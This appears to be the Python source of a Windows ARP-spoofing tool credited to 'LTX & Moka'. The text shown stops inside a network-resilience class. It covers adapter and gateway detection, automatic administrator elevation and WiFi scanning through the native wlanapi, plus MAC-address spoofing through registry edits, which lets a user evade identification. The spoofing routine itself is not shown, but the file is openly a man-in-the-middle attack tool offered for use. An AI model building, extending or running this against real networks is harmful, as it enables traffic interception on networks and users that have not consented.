import scapy.all as scapy
from scapy.layers import http
from scapy.config import conf
import time
import sys
import argparse
import socket
import os
import threading
import subprocess
import re
import random
import tempfile
import json
import ipaddress
import atexit
import logging
import warnings
import ctypes
import traceback
import xml.sax.saxutils as xml_escape
from ctypes import wintypes
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime
from dataclasses import dataclass
from typing import Optional, List, Dict, Tuple
from colorama import Fore, Style, init

init(autoreset=True)
conf.verb = 0
logging.getLogger("scapy").setLevel(logging.ERROR)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
warnings.filterwarnings("ignore", message=".*Ethernet destination MAC.*")
warnings.filterwarnings("ignore", message=".*MAC address.*ARP.*")
warnings.filterwarnings("ignore", category=UserWarning, module="scapy.*")

if os.name == "nt":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):
        pass

_session_logger: Optional["SessionLogger"] = None
title = "ARP-SPOOFER - LTX & Moka"

def _excepthook(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        safe_print(f"\n\n{Fore.LIGHTCYAN_EX}[*] Stopped by user. Exiting cleanly.")
        sys.exit(0)
    else:
        traceback.print_exception(exc_type, exc_value, exc_traceback)

sys.excepthook = _excepthook

RE_IPV4 = re.compile(r"\d+\.\d+\.\d+\.\d+")

def set_console_title(text: str) -> None:
    if os.name == "nt":
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(str(text))
        except Exception:
            pass
    else:
        sys.stdout.write(f"\x1b]2;{text}\x07")

def clear_console() -> None:
    if os.name == "nt":
        subprocess.run("cls", shell=True, check=False)
    else:
        subprocess.run(["clear"], check=False)

set_console_title(os.environ.get("ARP_SPOOFER_WINDOW_TITLE", title))

CHECK_INTERVAL = 30
TARGET_REFRESH_INTERVAL = 60
TARGET_MAC_REFRESH_INTERVAL = 75
SPOOF_INTERVAL = 2
INTERNET_CHECK_TIMEOUT = 5
INTERNET_CACHE_TTL = 15
RECOVERY_COOLDOWN = 120
LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")

@dataclass
class NetworkAdapter:
    index: int
    name: str
    description: str
    adapter_type: str
    mac: str
    ip: str
    gateway: str
    prefix: int
    status: str

    @property
    def ip_range(self) -> str:
        if not self.ip or not RE_IPV4.match(self.ip):
            return ""
        try:
            if self.prefix and 0 < self.prefix <= 32:
                return str(ipaddress.ip_interface(f"{self.ip}/{self.prefix}").network)
            return ".".join(self.ip.split(".")[:-1]) + ".0/24"
        except ValueError:
            return ".".join(self.ip.split(".")[:-1]) + ".0/24"

VIRTUAL_ADAPTER_KEYWORDS = (
    "virtualbox", "vmware", "hyper-v", "vethernet", "loopback", "vpn",
    "tap-windows", "wintun", "npcap", "bluetooth", "pseudo", "tunnel",
    "miniport", "isatap", "teredo", "6to4",
)

@dataclass
class NetworkContext:
    ip: str = ""
    gateway: str = ""
    ip_range: str = ""
    gateway_mac: Optional[str] = None
    interface_name: str = ""
    ssid: str = ""
    wifi_password: str = ""
    wifi_auth: str = ""
    is_wifi: bool = False

@dataclass
class WifiNetwork:
    ssid: str
    bssid: str
    signal: int
    auth: str
    open_network: bool

def get_gradient_color(step, total_steps):
    colors = [129, 135, 141, 147, 153, 159, 231, 255]
    index = int((step / total_steps) * (len(colors) - 1))
    return f"\033[38;5;{colors[index]}m"

def safe_print(text: str, **kwargs):
    try:
        print(text, **kwargs)
    except UnicodeEncodeError:
        clean = text.encode("ascii", errors="replace").decode("ascii")
        print(clean, **kwargs)

def print_banner():
    clear_console()
    lines = [
        " █████╗ ██████╗ ██████╗       ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ ",
        "██╔══██╗██╔══██╗██╔══██╗      ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗",
        "███████║██████╔╝██████╔╝█████╗███████║██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝",
        "██╔══██║██╔══██║██╔═══╝ ╚════╝╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗",
        "██║  ██║██║  ██║██║           ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║",
        "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝           ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝",
    ]
    for i, line in enumerate(lines):
        safe_print(get_gradient_color(i, len(lines)) + line)
    safe_print(f"\n{Fore.MAGENTA}{Style.BRIGHT}ARP-SPOOFER | By LTX & Moka")

def normalize_netsh_text(text: str) -> str:
    return text.replace("\xa0", " ").replace("\u00a0", " ")

def parse_netsh_field(text: str, *keys: str) -> str:
    text = normalize_netsh_text(text)
    for key in keys:
        match = re.search(rf"{re.escape(key)}\s*:\s*(.+)", text, re.I)
        if match:
            value = match.group(1).strip()
            if value and value.upper() != "N/A":
                return value
    return ""

def powershell_value(command: str) -> str:
    ok, out = run_cmd(f'powershell -NoProfile -Command "{command}"')
    return out.strip() if ok else ""

def setup_scapy_iface(adapter_name: str = ""):
    try:
        alias = adapter_name
        if not alias and os.name == "nt":
            alias = powershell_value(
                "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | "
                "Where-Object { $_.NextHop -ne '0.0.0.0' } | "
                "Sort-Object RouteMetric | Select-Object -First 1).InterfaceAlias"
            )
        if alias:
            for iface in scapy.get_if_list():
                if alias.lower() in iface.lower() or iface.lower() in alias.lower():
                    conf.iface = iface
                    return iface
        route = scapy.conf.route.route("0.0.0.0")
        if route and len(route) > 3 and route[3]:
            conf.iface = route[3]
            return route[3]
    except Exception:
        pass
    return None

def _is_virtual_adapter(description: str, name: str) -> bool:
    text = f"{description} {name}".lower()
    return any(k in text for k in VIRTUAL_ADAPTER_KEYWORDS)

def _adapter_type_from_desc(description: str) -> str:
    desc = description.lower()
    if re.search(r"wi-?fi|wireless|802\.11", desc):
        return "WiFi"
    if re.search(r"ethernet|gigabit|lan|realtek|intel.*network", desc):
        return "Ethernet"
    return "Other"

def get_network_adapters(include_down: bool = False) -> List[NetworkAdapter]:
    if os.name != "nt":
        return []

    status_filter = "" if include_down else "| Where-Object { $_.Status -eq 'Up' }"
    ps = (
        f"$rows = @(); Get-NetAdapter {status_filter} | ForEach-Object {{ "
        f"$n = $_.Name; $d = $_.InterfaceDescription; "
        f"$ipObj = Get-NetIPAddress -InterfaceAlias $n -AddressFamily IPv4 "
        f"-ErrorAction SilentlyContinue | "
        f"Where-Object {{ $_.IPAddress -notlike '169.254.*' -and $_.IPAddress -ne '127.0.0.1' }} | "
        f"Select-Object -First 1; "
        f"$ip = if ($ipObj) {{ $ipObj.IPAddress }} else {{ '' }}; "
        f"$pfx = if ($ipObj) {{ $ipObj.PrefixLength }} else {{ 24 }}; "
        f"$gw = (Get-NetRoute -InterfaceAlias $n -DestinationPrefix '0.0.0.0/0' "
        f"-ErrorAction SilentlyContinue | Sort-Object RouteMetric | "
        f"Select-Object -First 1 -ExpandProperty NextHop); "
        f"$t = if ($d -match 'Wi-?Fi|Wireless|802\\.11') {{ 'WiFi' }} "
        f"elseif ($d -match 'Ethernet|Gigabit|LAN') {{ 'Ethernet' }} else {{ 'Other' }}; "
        f"$rows += [PSCustomObject]@{{Name=$n;Description=$d;Type=$t;IP=$ip;"
        f"Gateway=$gw;MAC=$_.MacAddress;Prefix=$pfx;Status=$_.Status}} }}; "
        f"$rows | ConvertTo-Json -Compress"
    )
    ok, out = run_cmd(f'powershell -NoProfile -Command "{ps}"')
    if not ok or not out.strip():
        return []

    try:
        data = json.loads(out)
        if isinstance(data, dict):
            data = [data]
    except json.JSONDecodeError:
        return []

    adapters = []
    idx = 1
    for row in data:
        desc = str(row.get("Description", "") or "")
        name = str(row.get("Name", "") or "")
        if _is_virtual_adapter(desc, name):
            continue
        ip = str(row.get("IP", "") or "").strip()
        gateway = str(row.get("Gateway", "") or "").strip()
        if gateway and not RE_IPV4.match(gateway):
            gateway = ""
        adapters.append(
            NetworkAdapter(
                index=idx,
                name=name,
                description=desc,
                adapter_type=str(row.get("Type", "") or _adapter_type_from_desc(desc)),
                mac=str(row.get("MAC", "") or "").replace("-", ":").lower(),
                ip=ip,
                gateway=gateway,
                prefix=int(row.get("Prefix", 24) or 24),
                status=str(row.get("Status", "") or "Up"),
            )
        )
        idx += 1
    return adapters

def display_network_adapters(adapters: List[NetworkAdapter]):
    if not adapters:
        log_warn("No network adapters found.")
        return
    safe_print(f"\n{Fore.WHITE}+{'-' * 4}+{'-' * 22}+{'-' * 14}+{'-' * 16}+{'-' * 16}+{'-' * 16}+")
    safe_print(
        f"{Fore.WHITE}| {'#':<2} | {'Name':<20} | {'Type':<12} | "
        f"{'IP':<14} | {'Gateway':<14} | {'Status':<14} |"
    )
    safe_print(f"{Fore.WHITE}+{'-' * 4}+{'-' * 22}+{'-' * 14}+{'-' * 16}+{'-' * 16}+{'-' * 16}+")
    for a in adapters:
        ip = a.ip or "N/A"
        gw = a.gateway or "N/A"
        safe_print(
            f"{Fore.WHITE}| {Fore.CYAN}{a.index:<2}{Fore.WHITE} | "
            f"{a.name[:20]:<20} | {Fore.GREEN}{a.adapter_type:<12}{Fore.WHITE} | "
            f"{ip:<14} | {gw:<14} | {a.status:<14} |"
        )
    safe_print(f"{Fore.WHITE}+{'-' * 4}+{'-' * 22}+{'-' * 14}+{'-' * 16}+{'-' * 16}+{'-' * 16}+")

def pick_network_adapter(adapters: List[NetworkAdapter], choice: Optional[str]) -> Optional[NetworkAdapter]:
    if not adapters:
        return None
    if choice is None or choice == "__interactive__":
        display_network_adapters(adapters)
        raw = input(f"\n{Fore.WHITE}[?] Select adapter number (1-{len(adapters)}): ").strip()
        if not raw.isdigit():
            log_err("Invalid selection.")
            return None
        choice = raw
    if not str(choice).isdigit():
        log_err("Invalid adapter index.")
        return None
    num = int(choice)
    for a in adapters:
        if a.index == num:
            return a
    log_err(f"Adapter #{num} not found.")
    return None

def get_best_adapter() -> Optional[NetworkAdapter]:
    adapters = get_network_adapters()
    if not adapters:
        return None

    def score(a: NetworkAdapter) -> tuple:
        has_ip = 1 if a.ip and RE_IPV4.match(a.ip) else 0
        has_gw = 1 if a.gateway and RE_IPV4.match(a.gateway) else 0
        type_bonus = 1 if a.adapter_type in ("WiFi", "Ethernet") else 0
        return (has_gw, has_ip, type_bonus)

    return max(adapters, key=score)

def prompt_manual_network() -> Tuple[str, str]:
    log_info("Manual mode - enter network settings.")
    ip_range = input(f"{Fore.WHITE}[?] Network range (e.g. 192.168.1.0/24): ").strip()
    gateway = input(f"{Fore.WHITE}[?] Gateway IP (e.g. 192.168.1.1): ").strip()
    return ip_range, gateway

def apply_spoofed_mac(iface_name: str) -> bool:
    if os.name != "nt":
        log_warn("--spoof-mac is currently only implemented for Windows.")
        return False
    if not iface_name:
        log_err("No interface specified for MAC spoofing.")
        return False

    new_mac = "02" + "".join(f"{random.randint(0, 255):02x}" for _ in range(5))
    log_info(f"Attempting to change MAC on {iface_name} -> {new_mac}")
    
    run_cmd(f'netsh interface set interface name="{iface_name}" admin=disable')
    time.sleep(2)
    
    reg_path = r"HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}"
    ok, out = run_cmd(
        f'powershell -Command "Get-ChildItem {reg_path} -ErrorAction SilentlyContinue | '
        f'ForEach-Object {{ $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue; '
        f'if ($p.NetCfgInstanceId -and (Get-NetAdapter -InterfaceGuid $p.NetCfgInstanceId '
        f'-ErrorAction SilentlyContinue).Name -eq \'{iface_name}\') '
        f'{{ Set-ItemProperty -Path $_.PSPath -Name NetworkAddress -Value \'{new_mac.replace(":", "")}\'; '
        f'Write-Output OK }} }}"'
    )
    
    run_cmd(f'netsh interface set interface name="{iface_name}" admin=enable')
    time.sleep(5)
    
    if ok and "OK" in out:
        log_ok(f"MAC changed to {new_mac}. Renewing DHCP...")
        run_cmd(f'netsh interface ip set address name="{iface_name}" source=dhcp')
        run_cmd("ipconfig /release")
        time.sleep(1)
        run_cmd("ipconfig /renew")
        run_cmd("ipconfig /flushdns")
        return True
    log_err("Failed to spoof MAC address.")
    return False

def configure_network(args) -> Optional[NetworkAdapter]:
    selected: Optional[NetworkAdapter] = None
    adapters = get_network_adapters()

    if args.interface is not None:
        selected = pick_network_adapter(adapters, args.interface)
        if not selected:
            sys.exit(1)
        log_ok(f"Selected adapter: {selected.name} ({selected.adapter_type})")
        setup_scapy_iface(selected.name)

    if args.manual:
        if not args.ip_range or not args.gateway:
            args.ip_range, args.gateway = prompt_manual_network()
        if not args.ip_range or not args.gateway:
            log_err("Manual mode requires -r and -g (network range and gateway).")
            sys.exit(1)
        if not RE_IPV4.match(args.gateway):
            log_err("Invalid gateway IP.")
            sys.exit(1)
        if selected:
            return selected
        best = get_best_adapter()
        if best:
            setup_scapy_iface(best.name)
            log_info(f"Using adapter for capture: {best.name} ({best.adapter_type})")
            return best
        setup_scapy_iface()
        if adapters:
            log_warn("Manual mode: use -i to select the network adapter for packet capture.")
        return None

    if selected:
        if not args.ip_range:
            args.ip_range = selected.ip_range
        if not args.gateway:
            args.gateway = selected.gateway
    else:
        best = get_best_adapter()
        if best:
            selected = best
            setup_scapy_iface(best.name)
            if not args.ip_range:
                args.ip_range = best.ip_range
            if not args.gateway:
                args.gateway = best.gateway
            log_info(f"Auto-selected adapter: {best.name} ({best.adapter_type})")

    if not args.ip_range or not args.gateway:
        resilience = NetworkResilience(NetworkContext())
        ip, gateway, ip_range = resilience._detect_network(
            interface_name=selected.name if selected else ""
        )
        if not args.ip_range:
            args.ip_range = ip_range
        if not args.gateway:
            args.gateway = gateway

    if not args.ip_range or not args.gateway:
        log_err("Could not detect network. Use --manual with -r/-g or -i to select an adapter.")
        sys.exit(1)

    if args.ip_range == "UNKNOWN" or not RE_IPV4.match(args.gateway):
        log_err("Invalid network configuration detected.")
        sys.exit(1)

    return selected

def run_cmd(cmd, timeout=30, encoding=None):
    try:
        enc = encoding or ("cp850" if os.name == "nt" else "utf-8")
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            encoding=enc,
            errors="replace",
        )
        return result.returncode == 0, (result.stdout or "") + (result.stderr or "")
    except KeyboardInterrupt:
        raise
    except (subprocess.TimeoutExpired, Exception) as exc:
        return False, str(exc)

def run_netsh(cmd, timeout=30):
    ok, out = run_cmd(cmd, timeout=timeout, encoding="utf-8")
    if out.strip():
        return ok, out
    return run_cmd(cmd, timeout=timeout, encoding="cp850")

def extract_wifi_profile_ssid(line: str) -> Optional[str]:
    low = line.lower()
    if "profil tous les utilisateurs" not in low and "all user profile" not in low:
        return None
    if ":" not in line:
        return None
    ssid = line.split(":", 1)[1].strip()
    return ssid or None

def log_info(msg):
    safe_print(f"\033[K{Fore.LIGHTCYAN_EX}[*] {msg}")
    if _session_logger:
        _session_logger.write("INFO", msg)

def log_ok(msg):
    safe_print(f"\033[K{Fore.GREEN}[+] {msg}")
    if _session_logger:
        _session_logger.write("OK", msg)

def log_warn(msg):
    safe_print(f"\033[K{Fore.YELLOW}[!] {msg}")
    if _session_logger:
        _session_logger.write("WARN", msg)

def log_err(msg):
    safe_print(f"\033[K{Fore.RED}[-] {msg}")
    if _session_logger:
        _session_logger.write("ERROR", msg)

class SessionLogger:
    def __init__(self, log_path: Optional[str] = None):
        os.makedirs(LOG_DIR, exist_ok=True)
        if log_path:
            self.path = log_path
        else:
            stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.path = os.path.join(LOG_DIR, f"session_{stamp}.log")
        self._lock = threading.Lock()
        self.write("INFO", "Session started")

    def write(self, level: str, msg: str):
        line = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{level}] {msg}\n"
        with self._lock:
            with open(self.path, "a", encoding="utf-8") as fh:
                fh.write(line)

def pause_console(message: str = "\nPress Enter to continue..."):
    try:
        if sys.stdin.isatty():
            input(message)
            return
    except (EOFError, KeyboardInterrupt):
        pass
    if os.name == "nt":
        try:
            os.system("pause")
        except Exception:
            pass

def check_admin_windows() -> bool:
    if os.name != "nt":
        return os.geteuid() == 0
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False

def request_admin_elevation() -> None:
    if os.name != "nt":
        return
    if check_admin_windows():
        return
    if "--no-elevate" in sys.argv:
        return
    if "-h" in sys.argv or "--help" in sys.argv:
        return

    safe_print(f"{Fore.YELLOW}[*] Administrator privileges required.")

    script_path = os.path.abspath(sys.argv[0])
    script_dir = os.path.dirname(script_path) or os.getcwd()
    params = subprocess.list2cmdline([script_path] + sys.argv[1:])

    ret = ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, params, script_dir, 1
    )

    if ret <= 32:
        safe_print(f"{Fore.RED}[-] Elevation failed or was denied by the user (code {ret}).")
        sys.exit(1)

    sys.exit(0)

def export_scan_results(devices: List[dict], output_path: str):
    try:
        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or ".", exist_ok=True)
    except OSError:
        pass
    ext = os.path.splitext(output_path)[1].lower()
    if ext == ".json":
        payload = {"scanned_at": datetime.now().isoformat(), "devices": devices}
        with open(output_path, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2)
    else:
        with open(output_path, "w", encoding="utf-8") as fh:
            fh.write("ip,mac,hostname\n")
            for d in devices:
                fh.write(f"{d['ip']},{d['mac']},{d.get('name', 'Unknown')}\n")
    log_ok(f"Scan exported to {output_path}")

def export_wifi_results(networks: List[WifiNetwork], output_path: str):
    try:
        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or ".", exist_ok=True)
    except OSError:
        pass
    ext = os.path.splitext(output_path)[1].lower()
    rows = [
        {
            "ssid": n.ssid, "bssid": n.bssid, "signal": n.signal,
            "auth": n.auth, "open": n.open_network,
        } for n in networks
    ]
    if ext == ".json":
        payload = {"scanned_at": datetime.now().isoformat(), "networks": rows}
        with open(output_path, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2)
    else:
        with open(output_path, "w", encoding="utf-8") as fh:
            fh.write("ssid,bssid,signal,auth,open\n")
            for row in rows:
                fh.write(f"{row['ssid']},{row['bssid']},{row['signal']},{row['auth']},{row['open']}\n")
    log_ok(f"WiFi scan exported to {output_path}")

class _WLAN_GUID(ctypes.Structure):
    _fields_ = [
        ("Data1", wintypes.DWORD), ("Data2", wintypes.WORD),
        ("Data3", wintypes.WORD), ("Data4", wintypes.BYTE * 8),
    ]

class _DOT11_SSID(ctypes.Structure):
    _fields_ = [("SSIDLength", wintypes.ULONG), ("SSID", wintypes.BYTE * 32)]

class _WLAN_RATE_SET(ctypes.Structure):
    _fields_ = [("uRateSetLength", wintypes.ULONG), ("usRateSet", wintypes.USHORT * 126)]

class _WLAN_BSS_ENTRY(ctypes.Structure):
    _fields_ = [
        ("dot11Ssid", _DOT11_SSID), ("uPhyId", wintypes.ULONG),
        ("dot11Bssid", wintypes.BYTE * 6), ("dot11BssType", wintypes.DWORD),
        ("dot11BssPhyType", wintypes.DWORD), ("lRssi", wintypes.LONG),
        ("uLinkQuality", wintypes.ULONG), ("bInRegDomain", wintypes.BOOL),
        ("usBeaconPeriod", wintypes.USHORT), ("ullTimestamp", ctypes.c_ulonglong),
        ("ullHostTimestamp", ctypes.c_ulonglong), ("usCapabilityInformation", wintypes.USHORT),
        ("ulChCenterFrequency", wintypes.ULONG), ("wlanRateSet", _WLAN_RATE_SET),
        ("ulIeOffset", wintypes.ULONG), ("ulIeSize", wintypes.ULONG),
    ]

class _WLAN_BSS_LIST(ctypes.Structure):
    _fields_ = [("dwTotalSize", wintypes.DWORD), ("dwNumberOfItems", wintypes.DWORD)]

class _WLAN_INTERFACE_INFO(ctypes.Structure):
    _fields_ = [
        ("InterfaceGuid", _WLAN_GUID),
        ("strInterfaceDescription", wintypes.WCHAR * 256),
        ("isState", wintypes.DWORD),
    ]

class _WLAN_INTERFACE_INFO_LIST(ctypes.Structure):
    _fields_ = [("dwNumberOfItems", wintypes.DWORD), ("dwIndex", wintypes.DWORD)]

class _WLAN_AVAILABLE_NETWORK(ctypes.Structure):
    _fields_ = [
        ("strProfileName", wintypes.WCHAR * 256), ("dot11Ssid", _DOT11_SSID),
        ("dot11BssType", wintypes.DWORD), ("uNumberOfBssids", wintypes.ULONG),
        ("bNetworkConnectable", wintypes.BOOL), ("wlanNotConnectableReason", wintypes.DWORD),
        ("uNumberOfPhyTypes", wintypes.ULONG), ("dot11PhyTypes", wintypes.DWORD * 8),
        ("bMorePhyTypes", wintypes.BOOL), ("wlanSignalQuality", wintypes.ULONG),
        ("bSecurityEnabled", wintypes.BOOL), ("dot11DefaultAuthAlgorithm", wintypes.DWORD),
        ("dot11DefaultCipherAlgorithm", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
        ("dwReserved", wintypes.DWORD),
    ]

class _WLAN_AVAILABLE_NETWORK_LIST(ctypes.Structure):
    _fields_ = [("dwNumberOfItems", wintypes.DWORD), ("dwIndex", wintypes.DWORD)]

class NativeWifiScanner:
    WLAN_CLIENT_VERSION = 2
    ERROR_SUCCESS = 0
    DOT11_BSS_TYPE_ANY = 3

    GUID = _WLAN_GUID
    DOT11_SSID = _DOT11_SSID
    WLAN_RATE_SET = _WLAN_RATE_SET
    WLAN_BSS_ENTRY = _WLAN_BSS_ENTRY
    WLAN_BSS_LIST = _WLAN_BSS_LIST
    WLAN_INTERFACE_INFO = _WLAN_INTERFACE_INFO
    WLAN_INTERFACE_INFO_LIST = _WLAN_INTERFACE_INFO_LIST
    WLAN_AVAILABLE_NETWORK = _WLAN_AVAILABLE_NETWORK
    WLAN_AVAILABLE_NETWORK_LIST = _WLAN_AVAILABLE_NETWORK_LIST

    AUTH_NAMES = {
        1: "Open", 2: "Shared", 3: "WPA", 4: "WPA-PSK", 5: "WPA-None",
        6: "RSNA", 7: "WPA2", 8: "WPA2-PSK", 9: "WPA3", 10: "WPA3-SAE",
    }

    @classmethod
    def scan(cls) -> List[WifiNetwork]:
        if os.name != "nt":
            return []
        try:
            wlanapi = ctypes.windll.wlanapi
            cls._configure_wlanapi(wlanapi)
        except Exception:
            return []

        client_handle = wintypes.HANDLE()
        negotiated = wintypes.DWORD()
        result = wlanapi.WlanOpenHandle(
            cls.WLAN_CLIENT_VERSION, None, ctypes.byref(negotiated), ctypes.byref(client_handle)
        )
        if result != cls.ERROR_SUCCESS:
            return []

        networks: List[WifiNetwork] = []
        iface_list_ptr = ctypes.c_void_p()
        try:
            result = wlanapi.WlanEnumInterfaces(client_handle, None, ctypes.byref(iface_list_ptr))
            if result != cls.ERROR_SUCCESS or not iface_list_ptr.value:
                return []

            iface_list = ctypes.cast(iface_list_ptr, ctypes.POINTER(cls.WLAN_INTERFACE_INFO_LIST)).contents
            iface_base = ctypes.addressof(iface_list) + ctypes.sizeof(cls.WLAN_INTERFACE_INFO_LIST)
            iface_size = ctypes.sizeof(cls.WLAN_INTERFACE_INFO)

            auth_by_ssid = {}
            for idx in range(iface_list.dwNumberOfItems):
                iface = cls.WLAN_INTERFACE_INFO.from_address(iface_base + idx * iface_size)
                if iface.isState == 0:
                    continue

                guid = iface.InterfaceGuid
                wlanapi.WlanScan(client_handle, ctypes.byref(guid), None, None, None)
                time.sleep(2)

                auth_by_ssid.update(cls._read_available_networks(wlanapi, client_handle, guid))

                bss_ptr = ctypes.c_void_p()
                result = wlanapi.WlanGetNetworkBssList(
                    client_handle, ctypes.byref(guid), None,
                    cls.DOT11_BSS_TYPE_ANY, 0, None, ctypes.byref(bss_ptr)
                )
                if result != cls.ERROR_SUCCESS or not bss_ptr.value:
                    continue

                try:
                    networks.extend(cls._parse_bss_list(bss_ptr, auth_by_ssid))
                finally:
                    wlanapi.WlanFreeMemory(bss_ptr)
        finally:
            if iface_list_ptr.value:
                wlanapi.WlanFreeMemory(iface_list_ptr)
            wlanapi.WlanCloseHandle(client_handle, None)

        return cls._dedupe_networks(networks)

    @classmethod
    def _configure_wlanapi(cls, wlanapi):
        wlanapi.WlanOpenHandle.argtypes = [wintypes.DWORD, wintypes.LPVOID, ctypes.POINTER(wintypes.DWORD), ctypes.POINTER(wintypes.HANDLE)]
        wlanapi.WlanOpenHandle.restype = wintypes.DWORD
        wlanapi.WlanCloseHandle.argtypes = [wintypes.HANDLE, wintypes.LPVOID]
        wlanapi.WlanCloseHandle.restype = wintypes.DWORD
        wlanapi.WlanFreeMemory.argtypes = [wintypes.LPVOID]
        wlanapi.WlanFreeMemory.restype = None
        wlanapi.WlanEnumInterfaces.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.POINTER(ctypes.c_void_p)]
        wlanapi.WlanEnumInterfaces.restype = wintypes.DWORD
        wlanapi.WlanScan.argtypes = [wintypes.HANDLE, ctypes.POINTER(_WLAN_GUID), wintypes.LPVOID, wintypes.LPVOID, wintypes.LPVOID]
        wlanapi.WlanScan.restype = wintypes.DWORD
        wlanapi.WlanGetNetworkBssList.argtypes = [wintypes.HANDLE, ctypes.POINTER(_WLAN_GUID), wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, ctypes.POINTER(ctypes.c_void_p)]
        wlanapi.WlanGetNetworkBssList.restype = wintypes.DWORD
        wlanapi.WlanGetAvailableNetworkList.argtypes = [wintypes.HANDLE, ctypes.POINTER(_WLAN_GUID), wintypes.DWORD, wintypes.LPVOID, ctypes.POINTER(ctypes.c_void_p)]
        wlanapi.WlanGetAvailableNetworkList.restype = wintypes.DWORD

    @staticmethod
    def _dedupe_networks(networks: List[WifiNetwork]) -> List[WifiNetwork]:
        seen = set()
        unique = []
        for net in networks:
            key = (net.ssid, net.bssid)
            if key not in seen:
                seen.add(key)
                unique.append(net)
        return unique

    @classmethod
    def _read_available_networks(cls, wlanapi, client_handle, guid) -> Dict[str, str]:
        auth_map: Dict[str, str] = {}
        avail_ptr = ctypes.c_void_p()
        result = wlanapi.WlanGetAvailableNetworkList(
            client_handle, ctypes.byref(guid), 0, None, ctypes.byref(avail_ptr)
        )
        if result != cls.ERROR_SUCCESS or not avail_ptr.value:
            return auth_map

        try:
            avail_list = ctypes.cast(avail_ptr, ctypes.POINTER(cls.WLAN_AVAILABLE_NETWORK_LIST)).contents
            base = ctypes.addressof(avail_list) + ctypes.sizeof(cls.WLAN_AVAILABLE_NETWORK_LIST)
            entry_size = ctypes.sizeof(cls.WLAN_AVAILABLE_NETWORK)
            for idx in range(avail_list.dwNumberOfItems):
                entry = cls.WLAN_AVAILABLE_NETWORK.from_address(base + idx * entry_size)
                ssid = cls._decode_ssid(entry.dot11Ssid)
                if not ssid:
                    continue
                if not entry.bSecurityEnabled:
                    auth_map[ssid] = "Open"
                else:
                    auth_map[ssid] = cls.AUTH_NAMES.get(entry.dot11DefaultAuthAlgorithm, "Secured")
        finally:
            wlanapi.WlanFreeMemory(avail_ptr)
        return auth_map

    @classmethod
    def _parse_bss_list(cls, bss_ptr, auth_by_ssid: Dict[str, str]) -> List[WifiNetwork]:
        results: List[WifiNetwork] = []
        bss_list = ctypes.cast(bss_ptr, ctypes.POINTER(cls.WLAN_BSS_LIST)).contents
        base = ctypes.addressof(bss_list) + ctypes.sizeof(cls.WLAN_BSS_LIST)
        entry_size = ctypes.sizeof(cls.WLAN_BSS_ENTRY)

        for idx in range(bss_list.dwNumberOfItems):
            entry = cls.WLAN_BSS_ENTRY.from_address(base + idx * entry_size)
            ssid = cls._decode_ssid(entry.dot11Ssid)
            if not ssid:
                continue
            bssid = ":".join(f"{entry.dot11Bssid[i]:02x}" for i in range(6))
            signal = int(entry.uLinkQuality)
            auth = auth_by_ssid.get(ssid, "Open")
            if auth == "Open" and (entry.usCapabilityInformation & 0x0010):
                auth = "Secured"
            results.append(
                WifiNetwork(
                    ssid=ssid, bssid=bssid, signal=signal, auth=auth,
                    open_network=auth.lower() == "open",
                )
            )
        return results

    @staticmethod
    def _decode_ssid(dot11_ssid) -> str:
        length = int(dot11_ssid.SSIDLength)
        if length <= 0:
            return ""
        raw = bytes(dot11_ssid.SSID[:length])
        try:
            return raw.decode("utf-8")
        except UnicodeDecodeError:
            return raw.decode("latin-1", errors="replace")

class NetworkResilience:
    CAPTIVE_KEYWORDS = (
        "accept", "agree", "connect", "login", "continue", "terms", "conditions",
        "submit", "authorize", "authorization", "get online", "click to", "consent",
        "i agree", "free wifi", "get connected", "portal", "hotspot",
    )

    def __init__(self, initial_ctx: NetworkContext):
        self.initial_ctx = initial_ctx
        self.ctx = NetworkContext(**initial_ctx.__dict__)
        self._lock = threading.Lock()
        self._recovery_in_progress = False
        self._last_recovery = 0.0
        self._internet_cache: Tuple[bool, float] = (False, 0.0)
        self._recovery_count = 0

    def capture_initial_wifi(self):
        if os.name != "nt":
            return
        ok, out = run_cmd("netsh wlan show interfaces")
        if self._is_location_blocked(out):
            ok, out = run_cmd(
                'powershell -NoProfile -Command '
                '"Get-NetConnectionProfile | Select-Object Name, InterfaceAlias | '
                'ForEach-Object { $_.InterfaceAlias + \'|\' + $_.Name }"'
            )
            if ok and "|" in out:
                for line in out.splitlines():
                    if "|" in line:
                        iface, ssid = line.split("|", 1)
                        self.initial_ctx.is_wifi = True
                        self.initial_ctx.ssid = ssid.strip()
                        self.initial_ctx.interface_name = iface.strip()
                        break
        else:
            ssid = parse_netsh_field(out, "SSID")
            if not ssid:
                return
            self.initial_ctx.is_wifi = True
            self.initial_ctx.ssid = ssid
            self.initial_ctx.interface_name = parse_netsh_field(out, "Name", "Nom") or ""
